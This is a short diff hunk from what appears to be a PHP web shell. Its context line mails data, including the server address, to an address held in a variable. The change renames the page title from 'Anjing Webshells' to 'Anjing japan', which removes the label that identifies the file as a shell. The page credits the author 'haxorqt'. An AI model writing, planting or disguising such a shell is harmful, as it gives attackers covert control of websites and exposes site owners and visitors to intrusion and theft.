@@ -15,7 +15,7 @@ mail($dm, "MD", $ma, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Anjing Webshells</title>
+    <title>Anjing japan</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="author" content="haxorqt">
